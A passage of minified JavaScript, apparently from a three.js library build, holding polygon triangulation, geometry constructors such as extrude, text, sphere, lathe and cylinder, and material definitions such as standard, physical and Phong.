s=r.x<o.x?r.x<a.x?r.x:a.x:o.x<a.x?o.x:a.x,c=r.y<o.y?r.y<a.y?r.y:a.y:o.y<a.y?o.y:a.y,l=r.x>o.x?r.x>a.x?r.x:a.x:o.x>a.x?o.x:a.x,h=r.y>o.y?r.y>a.y?r.y:a.y:o.y>a.y?o.y:a.y,u=zo(s,c,t,i,n),d=zo(l,h,t,i,n),p=e.prevZ,f=e.nextZ;p&&p.z>=u&&f&&f.z<=d;){if(p!==e.prev&&p!==e.next&&No(r.x,r.y,o.x,o.y,a.x,a.y,p.x,p.y)&&Uo(p.prev,p,p.next)>=0)return!1;if(p=p.prevZ,f!==e.prev&&f!==e.next&&No(r.x,r.y,o.x,o.y,a.x,a.y,f.x,f.y)&&Uo(f.prev,f,f.next)>=0)return!1;f=f.nextZ}for(;p&&p.z>=u;){if(p!==e.prev&&p!==e.next&&No(r.x,r.y,o.x,o.y,a.x,a.y,p.x,p.y)&&Uo(p.prev,p,p.next)>=0)return!1;p=p.prevZ}for(;f&&f.z<=d;){if(f!==e.prev&&f!==e.next&&No(r.x,r.y,o.x,o.y,a.x,a.y,f.x,f.y)&&Uo(f.prev,f,f.next)>=0)return!1;f=f.nextZ}return!0}function Oo(e,t,i){var n=e;do{var r=n.prev,o=n.next.next;!Vo(r,o)&&Ho(r,n,n.next,o)&&Go(r,o)&&Go(o,r)&&(t.push(r.i/i),t.push(n.i/i),t.push(o.i/i),Xo(n),Xo(n.next),n=e=o),n=n.next}while(n!==e);return n}function Io(e,t,i,n,r,o){var a=e;do{for(var s=a.next.next;s!==a.prev;){if(a.i!==s.i&&jo(a,s)){var c=Wo(a,s);return a=Po(a,a.next),c=Po(c,c.next),Lo(a,t,i,n,r,o),void Lo(c,t,i,n,r,o)}s=s.next}a=a.next}while(a!==e)}function Bo(e,t){return e.x-t.x}function Do(e,t){if(t=function(e,t){var i,n=t,r=e.x,o=e.y,a=-1/0;do{if(o<=n.y&&o>=n.next.y&&n.next.y!==n.y){var s=n.x+(o-n.y)*(n.next.x-n.x)/(n.next.y-n.y);if(s<=r&&s>a){if(a=s,s===r){if(o===n.y)return n;if(o===n.next.y)return n.next}i=n.x<n.next.x?n:n.next}}n=n.next}while(n!==t);if(!i)return null;if(r===a)return i.prev;var c,l=i,h=i.x,u=i.y,d=1/0;n=i.next;for(;n!==l;)r>=n.x&&n.x>=h&&r!==n.x&&No(o<u?r:a,o,h,u,o<u?a:r,o,n.x,n.y)&&((c=Math.abs(o-n.y)/(r-n.x))<d||c===d&&n.x>i.x)&&Go(n,e)&&(i=n,d=c),n=n.next;return i}(e,t)){var i=Wo(t,e);Po(i,i.next)}}function zo(e,t,i,n,r){return(e=1431655765&((e=858993459&((e=252645135&((e=16711935&((e=32767*(e-i)*r)|e<<8))|e<<4))|e<<2))|e<<1))|(t=1431655765&((t=858993459&((t=252645135&((t=16711935&((t=32767*(t-n)*r)|t<<8))|t<<4))|t<<2))|t<<1))<<1}function Fo(e){var t=e,i=e;do{(t.x<i.x||t.x===i.x&&t.y<i.y)&&(i=t),t=t.next}while(t!==e);return i}function No(e,t,i,n,r,o,a,s){return(r-a)*(t-s)-(e-a)*(o-s)>=0&&(e-a)*(n-s)-(i-a)*(t-s)>=0&&(i-a)*(o-s)-(r-a)*(n-s)>=0}function jo(e,t){return e.next.i!==t.i&&e.prev.i!==t.i&&!function(e,t){var i=e;do{if(i.i!==e.i&&i.next.i!==e.i&&i.i!==t.i&&i.next.i!==t.i&&Ho(i,i.next,e,t))return!0;i=i.next}while(i!==e);return!1}(e,t)&&Go(e,t)&&Go(t,e)&&function(e,t){var i=e,n=!1,r=(e.x+t.x)/2,o=(e.y+t.y)/2;do{i.y>o!=i.next.y>o&&i.next.y!==i.y&&r<(i.next.x-i.x)*(o-i.y)/(i.next.y-i.y)+i.x&&(n=!n),i=i.next}while(i!==e);return n}(e,t)}function Uo(e,t,i){return(t.y-e.y)*(i.x-t.x)-(t.x-e.x)*(i.y-t.y)}function Vo(e,t){return e.x===t.x&&e.y===t.y}function Ho(e,t,i,n){return!!(Vo(e,i)&&Vo(t,n)||Vo(e,n)&&Vo(i,t))||Uo(e,t,i)>0!=Uo(e,t,n)>0&&Uo(i,n,e)>0!=Uo(i,n,t)>0}function Go(e,t){return Uo(e.prev,e,e.next)<0?Uo(e,t,e.next)>=0&&Uo(e,e.prev,t)>=0:Uo(e,t,e.prev)<0||Uo(e,e.next,t)<0}function Wo(e,t){var i=new Yo(e.i,e.x,e.y),n=new Yo(t.i,t.x,t.y),r=e.next,o=t.prev;return e.next=t,t.prev=e,i.next=r,r.prev=i,n.next=i,i.prev=n,o.next=n,n.prev=o,n}function qo(e,t,i,n){var r=new Yo(e,t,i);return n?(r.next=n.next,r.prev=n,n.next.prev=r,n.next=r):(r.prev=r,r.next=r),r}function Xo(e){e.next.prev=e.prev,e.prev.next=e.next,e.prevZ&&(e.prevZ.nextZ=e.nextZ),e.nextZ&&(e.nextZ.prevZ=e.prevZ)}function Yo(e,t,i){this.i=e,this.x=t,this.y=i,this.prev=null,this.next=null,this.z=null,this.prevZ=null,this.nextZ=null,this.steiner=!1}var Zo={area:function(e){for(var t=e.length,i=0,n=t-1,r=0;r<t;n=r++)i+=e[n].x*e[r].y-e[r].x*e[n].y;return.5*i},isClockWise:function(e){return Zo.area(e)<0},triangulateShape:function(e,t){var i=[],n=[],r=[];Qo(e),$o(i,e);var o=e.length;t.forEach(Qo);for(var a=0;a<t.length;a++)n.push(o),o+=t[a].length,$o(i,t[a]);var s=Ao(i,n);for(a=0;a<s.length;a+=3)r.push(s.slice(a,a+3));return r}};function Qo(e){var t=e.length;t>2&&e[t-1].equals(e[0])&&e.pop()}function $o(e,t){for(var i=0;i<t.length;i++)e.push(t[i].x),e.push(t[i].y)}function Jo(e,t){zt.call(this),this.type="ExtrudeGeometry",this.parameters={shapes:e,options:t},this.fromBufferGeometry(new Ko(e,t)),this.mergeVertices()}function Ko(e,t){dt.call(this),this.type="ExtrudeBufferGeometry",this.parameters={shapes:e,options:t},e=Array.isArray(e)?e:[e];for(var i=this,n=[],r=[],o=0,a=e.length;o<a;o++){s(e[o])}function s(e){var o=[],a=void 0!==t.curveSegments?t.curveSegments:12,s=void 0!==t.steps?t.steps:1,c=void 0!==t.depth?t.depth:100,l=void 0===t.bevelEnabled||t.bevelEnabled,h=void 0!==t.bevelThickness?t.bevelThickness:6,u=void 0!==t.bevelSize?t.bevelSize:h-2,d=void 0!==t.bevelOffset?t.bevelOffset:0,p=void 0!==t.bevelSegments?t.bevelSegments:3,m=t.extrudePath,v=void 0!==t.UVGenerator?t.UVGenerator:ea;void 0!==t.amount&&(console.warn("THREE.ExtrudeBufferGeometry: amount has been renamed to depth."),c=t.amount);var g,b,w,x,_,M,S,T,E=!1;m&&(g=m.getSpacedPoints(s),E=!0,l=!1,b=m.computeFrenetFrames(s,!1),w=new y,x=new y,_=new y),l||(p=0,h=0,u=0,d=0);var A=e.extractPoints(a),C=A.shape,P=A.holes;if(!Zo.isClockWise(C))for(C=C.reverse(),S=0,T=P.length;S<T;S++)M=P[S],Zo.isClockWise(M)&&(P[S]=M.reverse());var L=Zo.triangulateShape(C,P),R=C;for(S=0,T=P.length;S<T;S++)M=P[S],C=C.concat(M);function k(e,t,i){return t||console.error("THREE.ExtrudeGeometry: vec does not exist"),t.clone().multiplyScalar(i).add(e)}var O,I,B,D,z,F,N=C.length,j=L.length;function U(e,t,i){var n,r,o,a=e.x-t.x,s=e.y-t.y,c=i.x-e.x,l=i.y-e.y,h=a*a+s*s,u=a*l-s*c;if(Math.abs(u)>Number.EPSILON){var d=Math.sqrt(h),p=Math.sqrt(c*c+l*l),m=t.x-s/d,v=t.y+a/d,g=((i.x-l/p-m)*l-(i.y+c/p-v)*c)/(a*l-s*c),y=(n=m+a*g-e.x)*n+(r=v+s*g-e.y)*r;if(y<=2)return new f(n,r);o=Math.sqrt(y/2)}else{var b=!1;a>Number.EPSILON?c>Number.EPSILON&&(b=!0):a<-Number.EPSILON?c<-Number.EPSILON&&(b=!0):Math.sign(s)===Math.sign(l)&&(b=!0),b?(n=-s,r=a,o=Math.sqrt(h)):(n=a,r=s,o=Math.sqrt(h/2))}return new f(n/o,r/o)}for(var V=[],H=0,G=R.length,W=G-1,q=H+1;H<G;H++,W++,q++)W===G&&(W=0),q===G&&(q=0),V[H]=U(R[H],R[W],R[q]);var X,Y,Z=[],Q=V.concat();for(S=0,T=P.length;S<T;S++){for(M=P[S],X=[],H=0,W=(G=M.length)-1,q=H+1;H<G;H++,W++,q++)W===G&&(W=0),q===G&&(q=0),X[H]=U(M[H],M[W],M[q]);Z.push(X),Q=Q.concat(X)}for(O=0;O<p;O++){for(B=O/p,D=h*Math.cos(B*Math.PI/2),I=u*Math.sin(B*Math.PI/2)+d,H=0,G=R.length;H<G;H++)J((z=k(R[H],V[H],I)).x,z.y,-D);for(S=0,T=P.length;S<T;S++)for(M=P[S],X=Z[S],H=0,G=M.length;H<G;H++)J((z=k(M[H],X[H],I)).x,z.y,-D)}for(I=u+d,H=0;H<N;H++)z=l?k(C[H],Q[H],I):C[H],E?(x.copy(b.normals[0]).multiplyScalar(z.x),w.copy(b.binormals[0]).multiplyScalar(z.y),_.copy(g[0]).add(x).add(w),J(_.x,_.y,_.z)):J(z.x,z.y,0);for(Y=1;Y<=s;Y++)for(H=0;H<N;H++)z=l?k(C[H],Q[H],I):C[H],E?(x.copy(b.normals[Y]).multiplyScalar(z.x),w.copy(b.binormals[Y]).multiplyScalar(z.y),_.copy(g[Y]).add(x).add(w),J(_.x,_.y,_.z)):J(z.x,z.y,c/s*Y);for(O=p-1;O>=0;O--){for(B=O/p,D=h*Math.cos(B*Math.PI/2),I=u*Math.sin(B*Math.PI/2)+d,H=0,G=R.length;H<G;H++)J((z=k(R[H],V[H],I)).x,z.y,c+D);for(S=0,T=P.length;S<T;S++)for(M=P[S],X=Z[S],H=0,G=M.length;H<G;H++)z=k(M[H],X[H],I),E?J(z.x,z.y+g[s-1].y,g[s-1].x+D):J(z.x,z.y,c+D)}function $(e,t){var i,n;for(H=e.length;--H>=0;){i=H,(n=H-1)<0&&(n=e.length-1);var r=0,o=s+2*p;for(r=0;r<o;r++){var a=N*r,c=N*(r+1);ee(t+i+a,t+n+a,t+n+c,t+i+c)}}}function J(e,t,i){o.push(e),o.push(t),o.push(i)}function K(e,t,r){te(e),te(t),te(r);var o=n.length/3,a=v.generateTopUV(i,n,o-3,o-2,o-1);ie(a[0]),ie(a[1]),ie(a[2])}function ee(e,t,r,o){te(e),te(t),te(o),te(t),te(r),te(o);var a=n.length/3,s=v.generateSideWallUV(i,n,a-6,a-3,a-2,a-1);ie(s[0]),ie(s[1]),ie(s[3]),ie(s[1]),ie(s[2]),ie(s[3])}function te(e){n.push(o[3*e+0]),n.push(o[3*e+1]),n.push(o[3*e+2])}function ie(e){r.push(e.x),r.push(e.y)}!function(){var e=n.length/3;if(l){var t=0,r=N*t;for(H=0;H<j;H++)K((F=L[H])[2]+r,F[1]+r,F[0]+r);for(r=N*(t=s+2*p),H=0;H<j;H++)K((F=L[H])[0]+r,F[1]+r,F[2]+r)}else{for(H=0;H<j;H++)K((F=L[H])[2],F[1],F[0]);for(H=0;H<j;H++)K((F=L[H])[0]+N*s,F[1]+N*s,F[2]+N*s)}i.addGroup(e,n.length/3-e,0)}(),function(){var e=n.length/3,t=0;for($(R,t),t+=R.length,S=0,T=P.length;S<T;S++)$(M=P[S],t),t+=M.length;i.addGroup(e,n.length/3-e,1)}()}this.addAttribute("position",new tt(n,3)),this.addAttribute("uv",new tt(r,2)),this.computeVertexNormals()}Jo.prototype=Object.create(zt.prototype),Jo.prototype.constructor=Jo,Jo.prototype.toJSON=function(){var e=zt.prototype.toJSON.call(this);return ta(this.parameters.shapes,this.parameters.options,e)},Ko.prototype=Object.create(dt.prototype),Ko.prototype.constructor=Ko,Ko.prototype.toJSON=function(){var e=dt.prototype.toJSON.call(this);return ta(this.parameters.shapes,this.parameters.options,e)};var ea={generateTopUV:function(e,t,i,n,r){var o=t[3*i],a=t[3*i+1],s=t[3*n],c=t[3*n+1],l=t[3*r],h=t[3*r+1];return[new f(o,a),new f(s,c),new f(l,h)]},generateSideWallUV:function(e,t,i,n,r,o){var a=t[3*i],s=t[3*i+1],c=t[3*i+2],l=t[3*n],h=t[3*n+1],u=t[3*n+2],d=t[3*r],p=t[3*r+1],m=t[3*r+2],v=t[3*o],g=t[3*o+1],y=t[3*o+2];return Math.abs(s-h)<.01?[new f(a,1-c),new f(l,1-u),new f(d,1-m),new f(v,1-y)]:[new f(s,1-c),new f(h,1-u),new f(p,1-m),new f(g,1-y)]}};function ta(e,t,i){if(i.shapes=[],Array.isArray(e))for(var n=0,r=e.length;n<r;n++){var o=e[n];i.shapes.push(o.uuid)}else i.shapes.push(e.uuid);return void 0!==t.extrudePath&&(i.options.extrudePath=t.extrudePath.toJSON()),i}function ia(e,t){zt.call(this),this.type="TextGeometry",this.parameters={text:e,parameters:t},this.fromBufferGeometry(new na(e,t)),this.mergeVertices()}function na(e,t){var i=(t=t||{}).font;if(!i||!i.isFont)return console.error("THREE.TextGeometry: font parameter is not an instance of THREE.Font."),new zt;var n=i.generateShapes(e,t.size);t.depth=void 0!==t.height?t.height:50,void 0===t.bevelThickness&&(t.bevelThickness=10),void 0===t.bevelSize&&(t.bevelSize=8),void 0===t.bevelEnabled&&(t.bevelEnabled=!1),Ko.call(this,n,t),this.type="TextBufferGeometry"}function ra(e,t,i,n,r,o,a){zt.call(this),this.type="SphereGeometry",this.parameters={radius:e,widthSegments:t,heightSegments:i,phiStart:n,phiLength:r,thetaStart:o,thetaLength:a},this.fromBufferGeometry(new oa(e,t,i,n,r,o,a)),this.mergeVertices()}function oa(e,t,i,n,r,o,a){dt.call(this),this.type="SphereBufferGeometry",this.parameters={radius:e,widthSegments:t,heightSegments:i,phiStart:n,phiLength:r,thetaStart:o,thetaLength:a},e=e||1,t=Math.max(3,Math.floor(t)||8),i=Math.max(2,Math.floor(i)||6),n=void 0!==n?n:0,r=void 0!==r?r:2*Math.PI,o=void 0!==o?o:0,a=void 0!==a?a:Math.PI;var s,c,l=Math.min(o+a,Math.PI),h=0,u=[],d=new y,p=new y,f=[],m=[],v=[],g=[];for(c=0;c<=i;c++){var b=[],w=c/i,x=0;for(0==c&&0==o?x=.5/t:c==i&&l==Math.PI&&(x=-.5/t),s=0;s<=t;s++){var _=s/t;d.x=-e*Math.cos(n+_*r)*Math.sin(o+w*a),d.y=e*Math.cos(o+w*a),d.z=e*Math.sin(n+_*r)*Math.sin(o+w*a),m.push(d.x,d.y,d.z),p.copy(d).normalize(),v.push(p.x,p.y,p.z),g.push(_+x,1-w),b.push(h++)}u.push(b)}for(c=0;c<i;c++)for(s=0;s<t;s++){var M=u[c][s+1],S=u[c][s],T=u[c+1][s],E=u[c+1][s+1];(0!==c||o>0)&&f.push(M,S,E),(c!==i-1||l<Math.PI)&&f.push(S,T,E)}this.setIndex(f),this.addAttribute("position",new tt(m,3)),this.addAttribute("normal",new tt(v,3)),this.addAttribute("uv",new tt(g,2))}function aa(e,t,i,n,r,o){zt.call(this),this.type="RingGeometry",this.parameters={innerRadius:e,outerRadius:t,thetaSegments:i,phiSegments:n,thetaStart:r,thetaLength:o},this.fromBufferGeometry(new sa(e,t,i,n,r,o)),this.mergeVertices()}function sa(e,t,i,n,r,o){dt.call(this),this.type="RingBufferGeometry",this.parameters={innerRadius:e,outerRadius:t,thetaSegments:i,phiSegments:n,thetaStart:r,thetaLength:o},e=e||.5,t=t||1,r=void 0!==r?r:0,o=void 0!==o?o:2*Math.PI,i=void 0!==i?Math.max(3,i):8;var a,s,c,l=[],h=[],u=[],d=[],p=e,m=(t-e)/(n=void 0!==n?Math.max(1,n):1),v=new y,g=new f;for(s=0;s<=n;s++){for(c=0;c<=i;c++)a=r+c/i*o,v.x=p*Math.cos(a),v.y=p*Math.sin(a),h.push(v.x,v.y,v.z),u.push(0,0,1),g.x=(v.x/t+1)/2,g.y=(v.y/t+1)/2,d.push(g.x,g.y);p+=m}for(s=0;s<n;s++){var b=s*(i+1);for(c=0;c<i;c++){var w=a=c+b,x=a+i+1,_=a+i+2,M=a+1;l.push(w,x,M),l.push(x,_,M)}}this.setIndex(l),this.addAttribute("position",new tt(h,3)),this.addAttribute("normal",new tt(u,3)),this.addAttribute("uv",new tt(d,2))}function ca(e,t,i,n){zt.call(this),this.type="LatheGeometry",this.parameters={points:e,segments:t,phiStart:i,phiLength:n},this.fromBufferGeometry(new la(e,t,i,n)),this.mergeVertices()}function la(e,t,i,n){dt.call(this),this.type="LatheBufferGeometry",this.parameters={points:e,segments:t,phiStart:i,phiLength:n},t=Math.floor(t)||12,i=i||0,n=n||2*Math.PI,n=p.clamp(n,0,2*Math.PI);var r,o,a,s=[],c=[],l=[],h=1/t,u=new y,d=new f;for(o=0;o<=t;o++){var m=i+o*h*n,v=Math.sin(m),g=Math.cos(m);for(a=0;a<=e.length-1;a++)u.x=e[a].x*v,u.y=e[a].y,u.z=e[a].x*g,c.push(u.x,u.y,u.z),d.x=o/t,d.y=a/(e.length-1),l.push(d.x,d.y)}for(o=0;o<t;o++)for(a=0;a<e.length-1;a++){var b=r=a+o*e.length,w=r+e.length,x=r+e.length+1,_=r+1;s.push(b,w,_),s.push(w,x,_)}if(this.setIndex(s),this.addAttribute("position",new tt(c,3)),this.addAttribute("uv",new tt(l,2)),this.computeVertexNormals(),n===2*Math.PI){var M=this.attributes.normal.array,S=new y,T=new y,E=new y;for(r=t*e.length*3,o=0,a=0;o<e.length;o++,a+=3)S.x=M[a+0],S.y=M[a+1],S.z=M[a+2],T.x=M[r+a+0],T.y=M[r+a+1],T.z=M[r+a+2],E.addVectors(S,T).normalize(),M[a+0]=M[r+a+0]=E.x,M[a+1]=M[r+a+1]=E.y,M[a+2]=M[r+a+2]=E.z}}function ha(e,t){zt.call(this),this.type="ShapeGeometry","object"==typeof t&&(console.warn("THREE.ShapeGeometry: Options parameter has been removed."),t=t.curveSegments),this.parameters={shapes:e,curveSegments:t},this.fromBufferGeometry(new ua(e,t)),this.mergeVertices()}function ua(e,t){dt.call(this),this.type="ShapeBufferGeometry",this.parameters={shapes:e,curveSegments:t},t=t||12;var i=[],n=[],r=[],o=[],a=0,s=0;if(!1===Array.isArray(e))l(e);else for(var c=0;c<e.length;c++)l(e[c]),this.addGroup(a,s,c),a+=s,s=0;function l(e){var a,c,l,h=n.length/3,u=e.extractPoints(t),d=u.shape,p=u.holes;for(!1===Zo.isClockWise(d)&&(d=d.reverse()),a=0,c=p.length;a<c;a++)l=p[a],!0===Zo.isClockWise(l)&&(p[a]=l.reverse());var f=Zo.triangulateShape(d,p);for(a=0,c=p.length;a<c;a++)l=p[a],d=d.concat(l);for(a=0,c=d.length;a<c;a++){var m=d[a];n.push(m.x,m.y,0),r.push(0,0,1),o.push(m.x,m.y)}for(a=0,c=f.length;a<c;a++){var v=f[a],g=v[0]+h,y=v[1]+h,b=v[2]+h;i.push(g,y,b),s+=3}}this.setIndex(i),this.addAttribute("position",new tt(n,3)),this.addAttribute("normal",new tt(r,3)),this.addAttribute("uv",new tt(o,2))}function da(e,t){if(t.shapes=[],Array.isArray(e))for(var i=0,n=e.length;i<n;i++){var r=e[i];t.shapes.push(r.uuid)}else t.shapes.push(e.uuid);return t}function pa(e,t){dt.call(this),this.type="EdgesGeometry",this.parameters={thresholdAngle:t},t=void 0!==t?t:1;var i,n,r,o,a=[],s=Math.cos(p.DEG2RAD*t),c=[0,0],l={},h=["a","b","c"];e.isBufferGeometry?(o=new zt).fromBufferGeometry(e):o=e.clone(),o.mergeVertices(),o.computeFaceNormals();for(var u=o.vertices,d=o.faces,f=0,m=d.length;f<m;f++)for(var v=d[f],g=0;g<3;g++)i=v[h[g]],n=v[h[(g+1)%3]],c[0]=Math.min(i,n),c[1]=Math.max(i,n),void 0===l[r=c[0]+","+c[1]]?l[r]={index1:c[0],index2:c[1],face1:f,face2:void 0}:l[r].face2=f;for(r in l){var y=l[r];if(void 0===y.face2||d[y.face1].normal.dot(d[y.face2].normal)<=s){var b=u[y.index1];a.push(b.x,b.y,b.z),b=u[y.index2],a.push(b.x,b.y,b.z)}}this.addAttribute("position",new tt(a,3))}function fa(e,t,i,n,r,o,a,s){zt.call(this),this.type="CylinderGeometry",this.parameters={radiusTop:e,radiusBottom:t,height:i,radialSegments:n,heightSegments:r,openEnded:o,thetaStart:a,thetaLength:s},this.fromBufferGeometry(new ma(e,t,i,n,r,o,a,s)),this.mergeVertices()}function ma(e,t,i,n,r,o,a,s){dt.call(this),this.type="CylinderBufferGeometry",this.parameters={radiusTop:e,radiusBottom:t,height:i,radialSegments:n,heightSegments:r,openEnded:o,thetaStart:a,thetaLength:s};var c=this;e=void 0!==e?e:1,t=void 0!==t?t:1,i=i||1,n=Math.floor(n)||8,r=Math.floor(r)||1,o=void 0!==o&&o,a=void 0!==a?a:0,s=void 0!==s?s:2*Math.PI;var l=[],h=[],u=[],d=[],p=0,m=[],v=i/2,g=0;function b(i){var r,o,m,b=new f,w=new y,x=0,_=!0===i?e:t,M=!0===i?1:-1;for(o=p,r=1;r<=n;r++)h.push(0,v*M,0),u.push(0,M,0),d.push(.5,.5),p++;for(m=p,r=0;r<=n;r++){var S=r/n*s+a,T=Math.cos(S),E=Math.sin(S);w.x=_*E,w.y=v*M,w.z=_*T,h.push(w.x,w.y,w.z),u.push(0,M,0),b.x=.5*T+.5,b.y=.5*E*M+.5,d.push(b.x,b.y),p++}for(r=0;r<n;r++){var A=o+r,C=m+r;!0===i?l.push(C,C+1,A):l.push(C+1,C,A),x+=3}c.addGroup(g,x,!0===i?1:2),g+=x}!function(){var o,f,b=new y,w=new y,x=0,_=(t-e)/i;for(f=0;f<=r;f++){var M=[],S=f/r,T=S*(t-e)+e;for(o=0;o<=n;o++){var E=o/n,A=E*s+a,C=Math.sin(A),P=Math.cos(A);w.x=T*C,w.y=-S*i+v,w.z=T*P,h.push(w.x,w.y,w.z),b.set(C,_,P).normalize(),u.push(b.x,b.y,b.z),d.push(E,1-S),M.push(p++)}m.push(M)}for(o=0;o<n;o++)for(f=0;f<r;f++){var L=m[f][o],R=m[f+1][o],k=m[f+1][o+1],O=m[f][o+1];l.push(L,R,O),l.push(R,k,O),x+=6}c.addGroup(g,x,0),g+=x}(),!1===o&&(e>0&&b(!0),t>0&&b(!1)),this.setIndex(l),this.addAttribute("position",new tt(h,3)),this.addAttribute("normal",new tt(u,3)),this.addAttribute("uv",new tt(d,2))}function va(e,t,i,n,r,o,a){fa.call(this,0,e,t,i,n,r,o,a),this.type="ConeGeometry",this.parameters={radius:e,height:t,radialSegments:i,heightSegments:n,openEnded:r,thetaStart:o,thetaLength:a}}function ga(e,t,i,n,r,o,a){ma.call(this,0,e,t,i,n,r,o,a),this.type="ConeBufferGeometry",this.parameters={radius:e,height:t,radialSegments:i,heightSegments:n,openEnded:r,thetaStart:o,thetaLength:a}}function ya(e,t,i,n){zt.call(this),this.type="CircleGeometry",this.parameters={radius:e,segments:t,thetaStart:i,thetaLength:n},this.fromBufferGeometry(new ba(e,t,i,n)),this.mergeVertices()}function ba(e,t,i,n){dt.call(this),this.type="CircleBufferGeometry",this.parameters={radius:e,segments:t,thetaStart:i,thetaLength:n},e=e||1,t=void 0!==t?Math.max(3,t):8,i=void 0!==i?i:0,n=void 0!==n?n:2*Math.PI;var r,o,a=[],s=[],c=[],l=[],h=new y,u=new f;for(s.push(0,0,0),c.push(0,0,1),l.push(.5,.5),o=0,r=3;o<=t;o++,r+=3){var d=i+o/t*n;h.x=e*Math.cos(d),h.y=e*Math.sin(d),s.push(h.x,h.y,h.z),c.push(0,0,1),u.x=(s[r]/e+1)/2,u.y=(s[r+1]/e+1)/2,l.push(u.x,u.y)}for(r=1;r<=t;r++)a.push(r,r+1,0);this.setIndex(a),this.addAttribute("position",new tt(s,3)),this.addAttribute("normal",new tt(c,3)),this.addAttribute("uv",new tt(l,2))}ia.prototype=Object.create(zt.prototype),ia.prototype.constructor=ia,na.prototype=Object.create(Ko.prototype),na.prototype.constructor=na,ra.prototype=Object.create(zt.prototype),ra.prototype.constructor=ra,oa.prototype=Object.create(dt.prototype),oa.prototype.constructor=oa,aa.prototype=Object.create(zt.prototype),aa.prototype.constructor=aa,sa.prototype=Object.create(dt.prototype),sa.prototype.constructor=sa,ca.prototype=Object.create(zt.prototype),ca.prototype.constructor=ca,la.prototype=Object.create(dt.prototype),la.prototype.constructor=la,ha.prototype=Object.create(zt.prototype),ha.prototype.constructor=ha,ha.prototype.toJSON=function(){var e=zt.prototype.toJSON.call(this);return da(this.parameters.shapes,e)},ua.prototype=Object.create(dt.prototype),ua.prototype.constructor=ua,ua.prototype.toJSON=function(){var e=dt.prototype.toJSON.call(this);return da(this.parameters.shapes,e)},pa.prototype=Object.create(dt.prototype),pa.prototype.constructor=pa,fa.prototype=Object.create(zt.prototype),fa.prototype.constructor=fa,ma.prototype=Object.create(dt.prototype),ma.prototype.constructor=ma,va.prototype=Object.create(fa.prototype),va.prototype.constructor=va,ga.prototype=Object.create(ma.prototype),ga.prototype.constructor=ga,ya.prototype=Object.create(zt.prototype),ya.prototype.constructor=ya,ba.prototype=Object.create(dt.prototype),ba.prototype.constructor=ba;var wa=Object.freeze({__proto__:null,WireframeGeometry:so,ParametricGeometry:co,ParametricBufferGeometry:lo,TetrahedronGeometry:po,TetrahedronBufferGeometry:fo,OctahedronGeometry:mo,OctahedronBufferGeometry:vo,IcosahedronGeometry:go,IcosahedronBufferGeometry:yo,DodecahedronGeometry:bo,DodecahedronBufferGeometry:wo,PolyhedronGeometry:ho,PolyhedronBufferGeometry:uo,TubeGeometry:xo,TubeBufferGeometry:_o,TorusKnotGeometry:Mo,TorusKnotBufferGeometry:So,TorusGeometry:To,TorusBufferGeometry:Eo,TextGeometry:ia,TextBufferGeometry:na,SphereGeometry:ra,SphereBufferGeometry:oa,RingGeometry:aa,RingBufferGeometry:sa,PlaneGeometry:ai,PlaneBufferGeometry:si,LatheGeometry:ca,LatheBufferGeometry:la,ShapeGeometry:ha,ShapeBufferGeometry:ua,ExtrudeGeometry:Jo,ExtrudeBufferGeometry:Ko,EdgesGeometry:pa,ConeGeometry:va,ConeBufferGeometry:ga,CylinderGeometry:fa,CylinderBufferGeometry:ma,CircleGeometry:ya,CircleBufferGeometry:ba,BoxGeometry:class extends zt{constructor(e,t,i,n,r,o){super(),this.type="BoxGeometry",this.parameters={width:e,height:t,depth:i,widthSegments:n,heightSegments:r,depthSegments:o},this.fromBufferGeometry(new Ft(e,t,i,n,r,o)),this.mergeVertices()}},BoxBufferGeometry:Ft});function xa(e){We.call(this),this.type="ShadowMaterial",this.color=new Ne(0),this.transparent=!0,this.setValues(e)}function _a(e){Vt.call(this,e),this.type="RawShaderMaterial"}function Ma(e){We.call(this),this.defines={STANDARD:""},this.type="MeshStandardMaterial",this.color=new Ne(16777215),this.roughness=.5,this.metalness=.5,this.map=null,this.lightMap=null,this.lightMapIntensity=1,this.aoMap=null,this.aoMapIntensity=1,this.emissive=new Ne(0),this.emissiveIntensity=1,this.emissiveMap=null,this.bumpMap=null,this.bumpScale=1,this.normalMap=null,this.normalMapType=0,this.normalScale=new f(1,1),this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.roughnessMap=null,this.metalnessMap=null,this.alphaMap=null,this.envMap=null,this.envMapIntensity=1,this.refractionRatio=.98,this.wireframe=!1,this.wireframeLinewidth=1,this.wireframeLinecap="round",this.wireframeLinejoin="round",this.skinning=!1,this.morphTargets=!1,this.morphNormals=!1,this.setValues(e)}function Sa(e){Ma.call(this),this.defines={STANDARD:"",PHYSICAL:""},this.type="MeshPhysicalMaterial",this.reflectivity=.5,this.clearcoat=0,this.clearcoatRoughness=0,this.sheen=null,this.clearcoatNormalScale=new f(1,1),this.clearcoatNormalMap=null,this.transparency=0,this.setValues(e)}function Ta(e){We.call(this),this.type="MeshPhongMaterial",this.color=new Ne(16777215),this.specular=new Ne(1118481),this.shininess=30,this.map=null,this.lightMap=null,this.lightMapIntensity=1,this.aoMap=null,this.aoMapIntensity=1,this.emissive=new Ne(0),this.emissiveIntensity=1,this.emissiveMap=null,this.bumpMap=null,this.bumpScale=1,this.normalMap=null,this.normalMapType=0,this.normalScale=new f(1,1),this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.specularMap=null,this.alphaMap=null,this.envMap=null,this.combine=0,this.reflectivity=1,this.refractionRatio=.98,this.wireframe=!1,this.wireframeLinewidth=1,this.wireframeLinecap="round",this.wireframeLinejoin="round",this.skinning=!1,this.morphTargets=!1,this.morphNormals=!1,this.setValues(e)}function Ea(e){Ta.call(this),this.defines={TOON:""},this.type="MeshToonMaterial",this.gradientMap=null,this.setValues(e)}function Aa(e){We.call(this),this.type="MeshNormalMaterial",this.bumpMap=null,this.bumpScale=1,this.normalMap=null,this.normalMapType=0,this.normalScale=new f(1,1),this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.wireframe=!1,this.wireframeLinewidth=1,this.fog=!1,this.skinning=!1,this.morphTargets=!1,this.morphNormals=!1,this.setValues(e)}function Ca(e){We.call(this),this.type="MeshLambertMaterial",this.color=new Ne(16777215),this.map=null,this.lightMap=null,this.lightMapIntensity=1,this.aoMap=null,this.aoMapIntensity=1,this.emissive=new 